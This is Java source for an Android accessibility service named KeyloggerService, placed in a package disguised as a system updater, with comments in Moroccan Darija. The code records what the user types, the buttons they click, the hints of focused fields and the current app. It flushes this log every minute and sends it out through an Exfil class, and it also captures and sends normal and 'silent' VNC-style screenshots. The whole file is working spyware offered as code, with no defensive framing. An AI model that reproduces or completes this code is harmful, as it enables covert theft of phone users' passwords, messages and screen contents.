package com.sys.updater;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityService.ScreenshotResult;
import android.accessibilityservice.AccessibilityService.TakeScreenshotCallback;
import android.graphics.Bitmap;
import android.hardware.HardwareBuffer;
import android.os.Build;
import android.view.Display;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import java.io.File;
import java.io.FileOutputStream;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;

public class KeyloggerService extends AccessibilityService {
    
    public static KeyloggerService instance = null;
    
    private String currentPackage = "";
    private StringBuilder buffer = new StringBuilder();
    private Timer flushTimer;

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        instance = this;
        
        // Timer bach y-sift l'logs kol dqiqa
        flushTimer = new Timer();
        flushTimer.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                flushBuffer();
            }
        }, 60000, 60000);
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null) return;
        
        String pkg = event.getPackageName() != null ? event.getPackageName().toString() : "unknown";
        
        // 1. Window State Changed (Mnin kay-tbedel l'app)
        if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            if (!pkg.equals(currentPackage) && !pkg.equals("com.android.systemui")) {
                flushBuffer();
                currentPackage = pkg;
                buffer.append("\n\n=== [").append(pkg).append("] ===\n");
            }
        }

        // 2. Text Changed (Mnin kay-kteb)
        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            List<CharSequence> text = event.getText();
            if (text != null && !text.isEmpty()) {
                buffer.append("> ").append(text.get(0).toString()).append("\n");
            }
        }

        // 3. Clicks (Mnin kay-clicki 3la chi bouton)
        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_CLICKED) {
            AccessibilityNodeInfo source = event.getSource();
            if (source != null) {
                CharSequence text = source.getText();
                if (text != null && text.length() > 0) {
                    buffer.append("[CLICK: ").append(text).append("]\n");
                } else if (source.getContentDescription() != null) {
                    buffer.append("[CLICK: ").append(source.getContentDescription()).append("]\n");
                }
                source.recycle();
            }
        }

        // 4. Focus (Mnin kay-dkhel l chi 7a9l dyal l'kitba)
        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_FOCUSED) {
            AccessibilityNodeInfo source = event.getSource();
            if (source != null) {
                CharSequence hint = source.getHintText();
                if (hint != null && hint.length() > 0) {
                    buffer.append("[FOCUS: ").append(hint).append("]\n");
                }
                source.recycle();
            }
        }
    }

    private synchronized void flushBuffer() {
        if (buffer.length() > 0) {
            String data = buffer.toString();
            if (data.length() > 4000) {
                data = data.substring(data.length() - 4000);
            }
            Exfil.send("KEYLOG:\n" + data);
            buffer.setLength(0);
        }
    }

    // ================== SCREENSHOT LOGIC (NORMAL) ==================
    public void captureScreen() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            takeScreenshot(Display.DEFAULT_DISPLAY, getMainExecutor(), new TakeScreenshotCallback() {
                @Override
                public void onSuccess(ScreenshotResult screenshotResult) {
                    try {
                        HardwareBuffer buffer = screenshotResult.getHardwareBuffer();
                        Bitmap bitmap = Bitmap.wrapHardwareBuffer(buffer, screenshotResult.getColorSpace());
                        
                        File file = new File(getExternalFilesDir(null), "screenshot.jpg");
                        FileOutputStream fos = new FileOutputStream(file);
                        bitmap.compress(Bitmap.CompressFormat.JPEG, 90, fos);
                        fos.close();
                        buffer.close();
                        
                        Exfil.sendFile(file.getAbsolutePath(), "Photo", "Screen Capture");
                    } catch (Exception e) {
                        Exfil.send("Screenshot error: " + e.getMessage());
                    }
                }

                @Override
                public void onFailure(int errorCode) {
                    Exfil.send("Screenshot failed code: " + errorCode);
                }
            });
        } else {
            Exfil.send("Screenshot requires Android 11+");
        }
    }

    // ================== SILENT SCREENSHOT (L'VNC) ==================
    public void captureScreenSilent() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            takeScreenshot(Display.DEFAULT_DISPLAY, getMainExecutor(), new TakeScreenshotCallback() {
                @Override
                public void onSuccess(ScreenshotResult screenshotResult) {
                    try {
                        HardwareBuffer buffer = screenshotResult.getHardwareBuffer();
                        Bitmap bitmap = Bitmap.wrapHardwareBuffer(buffer, screenshotResult.getColorSpace());
                        if (bitmap == null) { buffer.close(); return; }
                        
                        File file = new File(getExternalFilesDir(null), "vnc.jpg");
                        FileOutputStream fos = new FileOutputStream(file);
                        bitmap.compress(Bitmap.CompressFormat.JPEG, 50, fos); // 50% quality bach ykoun sri3
                        fos.close(); buffer.close();
                        
                        Exfil.sendFile(file.getAbsolutePath(), "Photo", "VNC Frame");
                    } catch (Exception e) {}
                }
                @Override
                public void onFailure(int errorCode) {}
            });
        }
    }

    @Override
    public void onInterrupt() { instance = null; }
    
    @Override
    public void onDestroy() { instance = null; super.onDestroy(); }
}
